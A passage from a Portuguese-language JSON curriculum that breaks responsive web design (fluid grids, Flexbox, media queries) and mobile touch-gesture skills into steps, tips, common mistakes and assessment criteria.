                                  "learningObjective": "Dominar fluid grids como base para layouts adaptáveis.",
                                  "commonMistakes": [
                                    "Usar pixels fixos em vez de unidades relativas",
                                    "Esquecer de testar em zoom"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Explorar os pilares: Layouts Flexíveis e Media Queries",
                                  "subSteps": [
                                    "Aprender layouts flexíveis: imagens com max-width:100% e fontes em rem/em.",
                                    "Estudar media queries: sintaxe @media (max-width: 600px) {}",
                                    "Combinar os pilares: criar um layout que muda com media queries.",
                                    "Testar em DevTools do navegador (modo responsivo).",
                                    "Documentar como os três pilares (grids, flex, queries) interagem."
                                  ],
                                  "verification": "Escrever e testar um CSS com media query que altera um layout flexível.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Navegador Chrome/Firefox com DevTools",
                                    "Editor de código"
                                  ],
                                  "tips": "Sempre inclua viewport meta tag: <meta name='viewport' content='width=device-width, initial-scale=1'>.",
                                  "learningObjective": "Integrar layouts flexíveis e media queries aos grids fluidos.",
                                  "commonMistakes": [
                                    "Esquecer o reset de box-sizing: border-box",
                                    "Media queries sem breakpoints lógicos (ex: 768px para tablets)"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Sintetizar os pilares do Design Responsivo",
                                  "subSteps": [
                                    "Revisar os três pilares principais e suas interdependências.",
                                    "Criar um diagrama mental ou mapa conceitual ligando-os.",
                                    "Explicar como aplicá-los juntos em um projeto móvel.",
                                    "Pesquisar evoluções modernas (ex: CSS Container Queries).",
                                    "Preparar um resumo de 1 página sobre o conceito completo."
                                  ],
                                  "verification": "Apresentar um resumo oral ou escrito cobrindo definição, importância e pilares.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Ferramenta de diagrama (Draw.io, papel)",
                                    "Resumo anterior"
                                  ],
                                  "tips": "Lembre: Responsivo = Fluid Grids + Flexible Layouts + Media Queries.",
                                  "learningObjective": "Sintetizar todos os elementos em uma visão coesa.",
                                  "commonMistakes": [
                                    "Tratar pilares isoladamente, sem integração",
                                    "Ignorar performance em mobile"
                                  ]
                                }
                              ],
                              "practicalExample": "Desenvolva uma página de login simples com header, formulário e footer. Use fluid grids para o layout, imagens flexíveis no header e media queries para empilhar elementos em telas menores que 480px, simulando adaptação de desktop para mobile.",
                              "finalVerifications": [
                                "Definir design responsivo corretamente sem erros conceituais.",
                                "Listar e explicar os três pilares principais.",
                                "Identificar importância para apps móveis com exemplos.",
                                "Demonstrar compreensão testando um layout simples em DevTools.",
                                "Explicar diferenças entre responsivo, adaptativo e mobile-first.",
                                "Citar pelo menos dois benefícios reais para SEO e UX."
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição e pilares (peso 30%)",
                                "Profundidade na explicação da importância móvel (20%)",
                                "Capacidade de integrar conceitos em exemplo prático (25%)",
                                "Identificação correta de erros comuns (15%)",
                                "Clareza e uso de terminologia técnica (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Programação Web (CSS/HTML avançado)",
                                "UX/UI Design (Princípios de usabilidade)",
                                "Matemática (Proporções e cálculos relativos)",
                                "Gestão de Projetos (Mobile-first approach)",
                                "Acessibilidade Digital (WCAG e responsividade)"
                              ],
                              "realWorldApplication": "Empresas como Google, Facebook e e-commerces como Amazon usam design responsivo para garantir que seus sites funcionem perfeitamente em smartphones, tablets e desktops, reduzindo abandono de carrinho em 40% e melhorando ranqueamento no Google."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.5.1.2",
                            "name": "Implementar layouts flexíveis com CSS Flexbox",
                            "description": "Criar layouts que se ajustam dinamicamente usando propriedades do Flexbox como flex-direction, justify-content e align-items para telas móveis.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar um Container Flexbox Básico",
                                  "subSteps": [
                                    "Crie um arquivo HTML com uma div.container e 4-6 elementos filhos (ex: .item1 a .item6 com conteúdo como header, nav, main).",
                                    "Adicione CSS básico: defina larguras fixas (ex: 200px) e alturas (ex: 100px) nos itens, com background-color e border para visualização.",
                                    "Aplique display: flex; e uma altura fixa (ex: 400px) no .container.",
                                    "Teste flex-wrap: nowrap; (default) e mude para wrap; observando quebra de linha.",
                                    "Adicione box-sizing: border-box; globalmente para evitar overflows."
                                  ],
                                  "verification": "Os itens se alinham horizontalmente no container e quebram linha quando flex-wrap: wrap; é aplicado em telas estreitas.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Editor de código (VS Code ou similar)",
                                    "Navegador web com DevTools (Chrome)",
                                    "Arquivo HTML/CSS vazio"
                                  ],
                                  "tips": [
                                    "Use cores diferentes nos backgrounds dos itens para visualizar alinhamentos claramente.",
                                    "Defina margin: 10px; nos itens para espaçamento visual."
                                  ],
                                  "learningObjective": "Dominar a inicialização de um container flexível e entender o comportamento padrão dos itens flex.",
                                  "commonMistakes": [
                                    "Esquecer display: flex; no pai, fazendo itens se comportarem como block.",
                                    "Não definir altura no container, impedindo visualização de align-items.",
                                    "Ignorar box-sizing, causando larguras inesperadas."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Controlar Direção com flex-direction",
                                  "subSteps": [
                                    "Com flex-direction: row; (default), confirme alinhamento horizontal.",
                                    "Mude para flex-direction: column; e observe empilhamento vertical ideal para mobile.",
                                    "Teste flex-direction: row-reverse; para inverter ordem horizontal.",
                                    "Aplique flex-direction: column-reverse; e note inversão vertical.",
                                    "Combine com width: 100%; no container para simular telas móveis."
                                  ],
                                  "verification": "Itens mudam de orientação conforme propriedade alterada, sem perda de conteúdo em redimensionamento de janela.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Mesmo projeto do Step 1",
                                    "DevTools para redimensionar viewport"
                                  ],
                                  "tips": [
                                    "Use flex-direction: column; como padrão para layouts mobile-first.",
                                    "Combine com media queries para alternar row/column por breakpoint."
                                  ],
                                  "learningObjective": "Aplicar flex-direction para adaptar layouts a diferentes orientações de tela.",
                                  "commonMistakes": [
                                    "Confundir eixo principal com eixo cruzado, aplicando direção errada.",
                                    "Não testar em múltiplas larguras de tela após mudança."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Alinhar no Eixo Principal com justify-content",
                                  "subSteps": [
                                    "Aplique justify-content: flex-start; (default) e observe alinhamento à esquerda/topo.",
                                    "Teste justify-content: center; para centralizar itens no eixo principal.",
                                    "Experimente justify-content: space-between; para distribuição uniforme com espaços.",
                                    "Use justify-content: space-around; e space-evenly; comparando espaçamentos.",
                                    "Ajuste com flex-direction: column; para ver efeitos verticais em mobile."
                                  ],
                                  "verification": "Itens se distribuem conforme valor da propriedade em diferentes tamanhos de container.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Projeto anterior",
                                    "Ferramenta de inspeção CSS no navegador"
                                  ],
                                  "tips": [
                                    "space-between é ótimo para navegações com logo à esquerda e botão à direita.",
                                    "Monitore o eixo principal: horizontal em row, vertical em column."
                                  ],
                                  "learningObjective": "Dominar distribuição de itens no eixo principal para layouts equilibrados.",
                                  "commonMistakes": [
                                    "Usar justify-content em vez de align-items para alinhamento cruzado.",
                                    "Aplicar em containers sem altura/largura definida, sem efeito visível."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Alinhar no Eixo Cruzado com align-items",
                                  "subSteps": [
                                    "Com itens de alturas variadas, aplique align-items: stretch; (default) para preencher altura do container.",
                                    "Teste align-items: flex-start; para alinhar ao topo.",
                                    "Use align-items: center; para centralização vertical perfeita.",
                                    "Experimente align-items: baseline; com textos de tamanhos diferentes.",
                                    "Ajuste align-content para múltiplas linhas quando flex-wrap: wrap;."
                                  ],
                                  "verification": "Itens de alturas diferentes se alinham uniformemente no eixo cruzado.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Projeto em andamento",
                                    "DevTools para editar propriedades ao vivo"
                                  ],
                                  "tips": [
                                    "align-items: center; + justify-content: center; para centralização total.",
                                    "Defina align-self em itens individuais para overrides."
                                  ],
                                  "learningObjective": "Controlar alinhamento perpendicular ao eixo principal para precisão visual.",
                                  "commonMistakes": [
                                    "Confundir com justify-content, desalinhando elementos.",
                                    "Esquecer altura no container, tornando stretch/center ineficazes."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Implementar Layout Responsivo para Mobile",
                                  "subSteps": [
                                    "Adicione @media (max-width: 768px) { .container { flex-direction: column; justify-content: center; } }",
                                    "Teste em DevTools com dispositivos mobile (320px-768px).",
                                    "Ajuste itens com flex: 1; para crescimento igual em mobile.",
                                    "Inclua flex-basis e flex-grow para controle fino de tamanhos.",
                                    "Valide sem overflows ou gaps indesejados em breakpoints."
                                  ],
                                  "verification": "Layout se adapta perfeitamente: row em desktop, column em mobile, sem quebras visuais.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Projeto completo",
                                    "Emulador mobile no DevTools ou dispositivo real"
                                  ],
                                  "tips": [
                                    "Adote mobile-first: comece com column e mude para row em telas maiores.",
                                    "Use flex-shrink: 0; para prevenir encolhimento excessivo."
                                  ],
                                  "learningObjective": "Integrar Flexbox com media queries para design responsivo otimizado para mobile.",
                                  "commonMistakes": [
                                    "Media queries com min-width em vez de max-width para mobile-first.",
                                    "Não testar em múltiplos breakpoints reais."
                                  ]
                                }
                              ],
                              "practicalExample": "Crie um layout de perfil de usuário: em desktop, foto à esquerda (flex: 0 0 200px), infos à direita (flex: 1); em mobile, empilhe verticalmente com foto no topo centralizada (flex-direction: column; justify-content: center; align-items: center;).",
                              "finalVerifications": [
                                "Layout adapta-se dinamicamente de desktop para mobile sem overflows ou desalinhamentos.",
                                "Propriedades flex-direction, justify-content e align-items são usadas corretamente em pelo menos 3 cenários.",
                                "Testado em DevTools com viewports de 320px, 768px e 1200px+.",
                                "Itens quebram linha apropriadamente com flex-wrap.",
                                "Nenhum elemento sai do container em redimensionamentos.",
                                "Centralização funciona em ambos eixos principais/cruzados."
                              ],
                              "assessmentCriteria": [
                                "Uso preciso de display: flex;, flex-direction, justify-content e align-items (mínimo 80% correto).",
                                "Responsividade comprovada em 3+ breakpoints com media queries.",
                                "Código limpo, comentado e sem erros de sintaxe/CSS.",
                                "Exemplo prático funcional e visualmente apelativo.",
                                "Verificações finais todas atendidas sem exceções.",
                                "Tempo de carregamento e performance não afetados por Flexbox."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Cálculos de proporções, distribuição de espaço e flex-grow/shrink como equações.",
                                "Design Gráfico/UI: Princípios de hierarquia visual e grid responsivo.",
                                "Desenvolvimento Web Geral: Integração com HTML semântico e JavaScript para dinâmicos.",
                                "UX para Mobile: Otimização de touch targets e legibilidade em telas pequenas.",
                                "Acessibilidade: Melhoria de navegação com foco em layouts adaptáveis."
                              ],
                              "realWorldApplication": "Em e-commerces como Amazon ou apps PWAs, Flexbox permite galerias de produtos que se reorganizam em grid desktop e lista vertical mobile, garantindo usabilidade em 90%+ dos acessos via smartphone, reduzindo bounce rates e melhorando SEO mobile."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.5.1.3",
                            "name": "Utilizar media queries para breakpoints",
                            "description": "Aplicar media queries em CSS para definir estilos específicos em diferentes larguras de tela, como mobile (até 480px), tablet e desktop.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender os Conceitos Básicos de Media Queries e Breakpoints",
                                  "subSteps": [
                                    "Estude a sintaxe básica de media queries: @media (condição) { estilos }",
                                    "Aprenda as propriedades principais: min-width, max-width, min-height e orientation",
                                    "Identifique breakpoints comuns: mobile (até 480px), tablet (481px-768px), desktop (769px+)",
                                    "Compare abordagens mobile-first (min-width) vs desktop-first (max-width)",
                                    "Revise exemplos simples de documentação MDN ou CSS Tricks"
                                  ],
                                  "verification": "Explique verbalmente ou por escrito a sintaxe e liste 3 breakpoints com suas larguras",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação MDN Web Docs sobre Media Queries",
                                    "Editor de texto como VS Code",
                                    "Navegador web"
                                  ],
                                  "tips": "Sempre priorize mobile-first para melhor performance em dispositivos móveis",
                                  "learningObjective": "Compreender a sintaxe e propósitos de media queries para layouts responsivos",
                                  "commonMistakes": [
                                    "Confundir min-width com max-width",
                                    "Esquecer o ponto e vírgula após a regra @media"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Definir Breakpoints Usando Variáveis CSS",
                                  "subSteps": [
                                    "Crie variáveis CSS personalizadas para breakpoints no :root, ex: --mobile: 480px; --tablet: 768px; --desktop: 1024px",
                                    "Escreva sua primeira media query usando min-width: 0 para base mobile",
                                    "Adicione media queries para tablet: @media (min-width: var(--tablet)) {}",
                                    "Implemente para desktop: @media (min-width: var(--desktop)) {}",
                                    "Teste a cascata de estilos em um arquivo CSS simples"
                                  ],
                                  "verification": "Crie um CSS com 3 breakpoints definidos via variáveis e visualize no navegador sem erros",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "VS Code ou similar",
                                    "Arquivo HTML básico com <div> de teste",
                                    "Chrome DevTools"
                                  ],
                                  "tips": "Use variáveis para facilitar manutenção e reutilização em projetos maiores",
                                  "learningObjective": "Configurar breakpoints reutilizáveis com variáveis CSS para escalabilidade",
                                  "commonMistakes": [
                                    "Definir variáveis fora de :root",
                                    "Usar px fixos em vez de variáveis para flexibilidade"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Aplicar Estilos Específicos para Cada Breakpoint",
                                  "subSteps": [
                                    "No estilo base (mobile), use flex-direction: column para stack vertical",
                                    "Para tablet, altere para flex-direction: row com flex-wrap: wrap e ajuste widths",
                                    "Para desktop, defina grid-template-columns ou flex com 3 colunas iguais",
                                    "Ajuste fontes, paddings e margens progressivamente maiores por breakpoint",
                                    "Inclua uma media query para orientação landscape em mobile se aplicável"
                                  ],
                                  "verification": "Aplique estilos em um layout de 3 seções e confirme adaptação visual em diferentes widths",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "HTML com header, nav e main",
                                    "CSS com flexbox ou grid",
                                    "Live Server extension no VS Code"
                                  ],
                                  "tips": "Aumente tamanhos de fonte e espaçamentos em telas maiores para melhor legibilidade",
                                  "learningObjective": "Implementar estilos condicionais que criem layouts fluidos e adaptáveis",
                                  "commonMistakes": [
                                    "Sobrescrever estilos desnecessariamente",
                                    "Ignorar padding em telas pequenas"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar, Depurar e Otimizar Media Queries",
                                  "subSteps": [
                                    "Use DevTools do Chrome (Ctrl+Shift+M) para simular dispositivos mobile, tablet e desktop",
                                    "Verifique quebras de layout redimensionando a janela e testando em 320px, 768px e 1200px",
                                    "Corrija erros comuns como overflow hidden ou textos cortados ajustando media queries",
                                    "Meça performance com Lighthouse e otimize queries desnecessárias",
                                    "Teste em dispositivos reais ou emuladores para validar acessibilidade"
                                  ],
                                  "verification": "Gere um relatório de testes mostrando screenshots ou gravação de adaptações perfeitas",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Chrome DevTools",
                                    "Lighthouse extension",
                                    "Dispositivos físicos ou BrowserStack gratuito"
                                  ],
                                  "tips": "Ative 'Device Toolbar' e use throttling para simular redes móveis reais",
                                  "learningObjective": "Validar e refinar media queries para responsividade robusta",
                                  "commonMistakes": [
                                    "Testar apenas em desktop",
                                    "Esquecer de testar orientação portrait/landscape"
                                  ]
                                }
                              ],
                              "practicalExample": "Crie uma landing page com header fixo, menu hamburger em mobile que vira horizontal em tablet/desktop, e grid de cards que muda de 1 coluna (mobile) para 2 (tablet) e 3 (desktop). Use flexbox e ajuste paddings: 10px mobile, 20px tablet, 40px desktop.",
                              "finalVerifications": [
                                "Layout stack vertical perfeito até 480px sem overflows",
                                "Transição suave para 2 colunas entre 481px-768px",
                                "3 colunas otimizadas acima de 769px com espaçamentos proporcionais",
                                "Fontes legíveis e botões touch-friendly em mobile (mín. 44px)",
                                "Nenhuma media query quebrada em landscape ou portrait",
                                "Performance Lighthouse >90 em mobile"
                              ],
                              "assessmentCriteria": [
                                "Sintaxe de media queries 100% correta sem erros de CSS",
                                "Uso consistente de mobile-first com min-width",
                                "Breakpoints lógicos alinhados a padrões (mobile 480px, tablet 768px, desktop 1024px)",
                                "Estilos não redundantes e cascata funcional",
                                "Responsividade testada em pelo menos 5 tamanhos de tela",
                                "Acessibilidade básica atendida (contraste e tamanhos touch)"
                              ],
                              "crossCurricularConnections": [
                                "UI/UX Design: Princípios de design responsivo e hierarquia visual",
                                "Acessibilidade Web: Conformidade com WCAG para múltiplos dispositivos",
                                "Matemática Aplicada: Cálculos de porcentagens e unidades relativas (vw, rem, em)",
                                "Desenvolvimento de Software: Integração com frameworks como Bootstrap ou Tailwind",
                                "Análise de Dados: Métricas de uso de dispositivos via Google Analytics"
                              ],
                              "realWorldApplication": "Desenvolver sites e apps web acessíveis em smartphones (70% do tráfego), tablets e desktops, melhorando retenção de usuários, SEO (Google prioriza mobile-first) e conversões em e-commerces ou portais corporativos."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.2.5.1.1"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.2.5.2",
                        "name": "Gestos Touch em Interfaces Móveis",
                        "description": "Princípios e técnicas para projetar e implementar interações baseadas em toques, melhorando a experiência do usuário em dispositivos touch.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.5.2.1",
                            "name": "Identificar tipos de gestos touch comuns",
                            "description": "Reconhecer e descrever gestos como tap, double-tap, swipe, pinch-to-zoom, long press e sua aplicação em navegação e controles de UI móveis.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Familiarizar-se com gestos básicos de toque único",
                                  "subSteps": [
                                    "Pesquise a definição de 'tap' (toque simples) e observe sua função em botões e links.",
                                    "Identifique 'double-tap' (toque duplo rápido) e teste em apps como galeria de fotos.",
                                    "Estude 'long press' (pressão prolongada) e pratique em ícones para acessar menus contextuais.",
                                    "Compare os três gestos visualizando animações em tutoriais online.",
                                    "Anote as diferenças em duração e velocidade de execução."
                                  ],
                                  "verification": "Criar uma tabela comparativa com definições e exemplos de uso dos três gestos.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Dispositivo móvel Android/iOS",
                                    "Vídeos tutoriais no YouTube sobre gestos touch",
                                    "Bloco de notas ou app de anotações"
                                  ],
                                  "tips": "Execute os gestos em modo avião para evitar interferências de apps.",
                                  "learningObjective": "Diferenciar tap, double-tap e long press por duração e aplicação.",
                                  "commonMistakes": "Confundir double-tap com dois taps separados ou long press com tap prolongado sem intenção."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar gestos de deslize e multi-toque",
                                  "subSteps": [
                                    "Aprenda 'swipe' (deslize) em direções: esquerda, direita, cima e baixo, testando em listas de apps.",
                                    "Pratique 'pinch-to-zoom' (beliscar para aproximar/afastar) em imagens ou mapas.",
                                    "Observe variações como swipe duplo ou pinch com três dedos em diferentes apps.",
                                    "Registre velocidades ideais para cada gesto em um diário de prática.",
                                    "Assista demonstrações em emuladores de UI móvel."
                                  ],
                                  "verification": "Gravar um vídeo curto demonstrando swipe e pinch-to-zoom corretamente em um app.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Smartphone ou tablet",
                                    "App de galeria ou Google Maps",
                                    "Emulador Android Studio (opcional)"
                                  ],
                                  "tips": "Use tela limpa e dedos secos para precisão nos gestos multi-toque.",
                                  "learningObjective": "Executar e reconhecer swipe e pinch-to-zoom em contextos de navegação.",
                                  "commonMistakes": "Aplicar swipe muito devagar, confundindo com drag, ou pinch sem sincronia entre dedos."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Entender aplicações em navegação e controles de UI móveis",
                                  "subSteps": [
                                    "Analise como tap e double-tap são usados em navegação de telas principais.",
                                    "Estude swipe para rolagem e alternância de abas em browsers móveis.",
                                    "Investigue long press para edição e pinch-to-zoom em interfaces responsivas.",
                                    "Mapeie gestos em um fluxograma de um app comum como Instagram.",
                                    "Discuta com um colega ou em fórum como esses gestos melhoram a UX."
                                  ],
                                  "verification": "Desenhar um diagrama mostrando 5 gestos e suas aplicações em um app fictício.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Papel e caneta ou ferramenta digital como Draw.io",
                                    "Apps reais: Instagram, Chrome Mobile"
                                  ],
                                  "tips": "Pense em usuários com deficiências motoras para contextualizar acessibilidade.",
                                  "learningObjective": "Associar cada gesto a funções específicas de UI/UX móvel.",
                                  "commonMistakes": "Ignorar contexto cultural, como swipe da direita em apps RTL (direita para esquerda)."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar identificação e descrição em cenários reais",
                                  "subSteps": [
                                    "Navegue por 3 apps diferentes identificando pelo menos 4 gestos cada.",
                                    "Descreva verbalmente ou por escrito o gesto, sua execução e propósito.",
                                    "Teste em diferentes dispositivos (celular vs. tablet) notando adaptações.",
                                    "Crie flashcards com gestos e teste autoavaliação.",
                                    "Simule erros intencionais e corrija para reforçar aprendizado."
                                  ],
                                  "verification": "Quiz autoaplicado com 10 perguntas sobre gestos observados, acertos >90%.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Múltiplos dispositivos móveis",
                                    "App Quizlet para flashcards",
                                    "Gravador de voz"
                                  ],
                                  "tips": "Varie apps: jogos, redes sociais e produtividade para diversidade.",
                                  "learningObjective": "Identificar e descrever gestos espontaneamente em interfaces reais.",
                                  "commonMistakes": "Focar só em apps nativos, ignorando gestos customizados em apps de terceiros."
                                }
                              ],
                              "practicalExample": "Em um app de e-commerce como Mercado Livre, use tap para selecionar produto, swipe para rolar lista, pinch-to-zoom para ampliar imagem e long press para opções de compartilhamento.",
                              "finalVerifications": [
                                "Listar e demonstrar corretamente os 5 gestos principais sem hesitação.",
                                "Descrever aplicações de cada gesto em pelo menos 2 apps reais.",
                                "Identificar gestos em um vídeo de tela gravado de um app desconhecido.",
                                "Explicar diferenças entre gestos semelhantes (ex: swipe vs. drag).",
                                "Criar um guia rápido de 1 página com todos os gestos.",
                                "Autoavaliar precisão em um teste prático com 95% de acerto."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de gestos (100% dos exemplos corretos).",
                                "Clareza na descrição verbal e escrita das aplicações.",
                                "Profundidade nos subpassos de prática e verificações.",
                                "Criatividade em exemplos reais e conexões interdisciplinares.",
                                "Tempo de execução dentro das estimativas com eficiência.",
                                "Ausência de erros comuns listados nos steps."
                              ],
                              "crossCurricularConnections": [
                                "Design Gráfico: Animações e feedback visual para gestos.",
                                "Programação: Implementação via APIs como GestureDetector no Android.",
                                "Acessibilidade: Adaptação para VoiceOver (iOS) ou TalkBack (Android).",
                                "Psicologia Cognitiva: Affordances e aprendizado motor de interfaces.",
                                "Ergonomia: Design centrado no usuário para toques intuitivos."
                              ],
                              "realWorldApplication": "Desenvolver apps móveis intuitivos, otimizando UX para retenção de usuários em e-commerces, redes sociais e jogos, reduzindo taxa de abandono por interfaces não intuitivas."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.5.2.2",
                            "name": "Implementar detecção de gestos com JavaScript",
                            "description": "Usar eventos touch como touchstart, touchmove e touchend para detectar e responder a gestos em aplicações web móveis.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Eventos Touch Básicos",
                                  "subSteps": [
                                    "Crie um elemento HTML interativo, como um div com ID 'gestureArea'.",
                                    "Adicione listeners para touchstart, touchmove e touchend usando addEventListener.",
                                    "Previna o comportamento padrão com preventDefault() em touchmove para evitar scroll indesejado.",
                                    "Registre coordenadas iniciais no touchstart (touches[0].clientX e clientY).",
                                    "Limpe variáveis no touchend."
                                  ],
                                  "verification": "Abra o DevTools no mobile ou emulador; verifique se os eventos são logados corretamente sem comportamentos padrão.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Editor de código (VS Code)",
                                    "Navegador com DevTools (Chrome)",
                                    "Emulador mobile ou dispositivo físico"
                                  ],
                                  "tips": "Use passive: false nos listeners para permitir preventDefault.",
                                  "learningObjective": "Configurar captura básica de eventos touch em elementos web.",
                                  "commonMistakes": [
                                    "Esquecer preventDefault levando a scroll",
                                    "Não usar touches[0] para single touch",
                                    "Não limpar estados no touchend"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Capturar e Armazenar Dados de Movimento",
                                  "subSteps": [
                                    "No touchstart, armazene posição inicial e tempo.",
                                    "No touchmove, calcule deltaX = currentX - initialX e deltaY = currentY - initialY.",
                                    "Registre velocidade como distância / tempo decorrido.",
                                    "Armazene histórico de pontos para gestos complexos como pinch (usando touches.length > 1).",
                                    "Atualize variáveis em tempo real sem bloquear a UI."
                                  ],
                                  "verification": "Console.log deltaX, deltaY e velocidade; observe valores mudando suavemente durante toque.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Código do Step 1",
                                    "Calculadora para fórmulas vetoriais"
                                  ],
                                  "tips": "Use requestAnimationFrame para atualizações suaves em touchmove.",
                                  "learningObjective": "Processar movimentos touch para extrair métricas básicas como direção e velocidade.",
                                  "commonMistakes": [
                                    "Calcular deltas incorretamente (usar pageX em vez de clientX)",
                                    "Ignorar multi-touch para pinch",
                                    "Atualizações síncronas causando lag"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Detectar Gestos Específicos",
                                  "subSteps": [
                                    "Defina thresholds: ex. swipe se |deltaX| > 50px e |deltaY| < 20px.",
                                    "Classifique direção: swipe direito se deltaX > 0, esquerdo se < 0.",
                                    "Para pinch, calcule distância entre touches[0] e touches[1] e compare com inicial.",
                                    "Implemente debounce para evitar detecções múltiplas.",
                                    "Dispare eventos customizados como 'swipe-left' no touchend."
                                  ],
                                  "verification": "Teste swipes; confirme alertas ou logs para 'swipe-left', 'swipe-right', 'pinch-in/out'.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Código anterior",
                                    "Dispositivo touch para testes reais"
                                  ],
                                  "tips": "Normalize ângulos com Math.atan2(deltaY, deltaX) para gestos diagonais.",
                                  "learningObjective": "Traduzir dados de touch em gestos reconhecíveis com lógica condicional.",
                                  "commonMistakes": [
                                    "Thresholds baixos causando falsos positivos",
                                    "Não debounçar levando a spam",
                                    "Ignorar rotação para gestos avançados"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Responder e Integrar Gestos em uma Aplicação",
                                  "subSteps": [
                                    "Crie handlers para gestos: ex. swipe-left avança slide em um carousel.",
                                    "Adicione feedback visual como animações CSS durante gesto.",
                                    "Integre com estado da app (ex. React/Vanilla JS state).",
                                    "Teste responsividade com media queries para mobile.",
                                    "Otimize performance removendo listeners desnecessários."
                                  ],
                                  "verification": "Navegue por um carousel via swipes; confirme fluidez sem lags ou erros.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Biblioteca CSS para transições (opcional)",
                                    "Ferramentas de teste mobile (BrowserStack)"
                                  ],
                                  "tips": "Use transform: translateX para animações swipe suaves.",
                                  "learningObjective": "Conectar detecção de gestos a ações UI práticas e responsivas.",
                                  "commonMistakes": [
                                    "Animações conflitando com touch",
                                    "Não testar em diferentes tamanhos de tela",
                                    "Memória leaks de listeners"
                                  ]
                                }
                              ],
                              "practicalExample": "Implemente um gallery de imagens mobile onde swipe esquerdo vai para a próxima imagem, swipe direito para anterior, e pinch-out faz zoom na imagem atual, usando apenas vanilla JavaScript em uma página web PWA.",
                              "finalVerifications": [
                                "Eventos touchstart/move/end disparam sem interferir no scroll da página.",
                                "Swipe horizontal é detectado com precisão acima de 90% em testes.",
                                "Pinch altera escala da imagem suavemente.",
                                "Gestos funcionam em Chrome/Safari mobile sem erros no console.",
                                "Performance mantém 60fps durante gestos longos.",
                                "Fallback para mouse em desktop simula gestos corretamente."
                              ],
                              "assessmentCriteria": [
                                "Código modular com funções separadas para cada evento e gesto.",
                                "Uso correto de preventDefault e passive listeners para performance.",
                                "Thresholds e lógica de detecção bem documentados e ajustáveis.",
                                "Testes em pelo menos 2 dispositivos mobile reais ou emuladores.",
                                "Integração seamless com UI existente sem quebrar acessibilidade.",
                                "Tratamento de edge cases como toques rápidos ou multi-touch inválidos."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Cálculo de vetores, distâncias euclidianas e ângulos.",
                                "Design de UX/UI: Princípios de gestos intuitivos e feedback háptico.",
                                "Desenvolvimento Web: Eventos DOM, performance e PWAs.",
                                "Física: Modelagem de movimento e inércia em interações.",
                                "Acessibilidade: Suporte a gestos para usuários com deficiências motoras."
                              ],
                              "realWorldApplication": "Em apps como Tinder (swipes para likes), Instagram (swipes em stories), ou Google Maps (pinch para zoom), permitindo interfaces touch nativas em sites web responsivos e PWAs, melhorando engajamento mobile sem apps nativos."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.2.5.2.1"
                            ]
                          },
                          {
                            "id": "10.1.2.5.2.3",
                            "name": "Projetar feedback visual para gestos",
                            "description": "Criar animações e transições CSS/JS para fornecer feedback imediato em gestos, como ripple effects em taps e indicadores de swipe.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender princípios de feedback visual para gestos touch",
                                  "subSteps": [
                                    "Estude tipos comuns de gestos touch: tap, swipe, pinch e long press.",
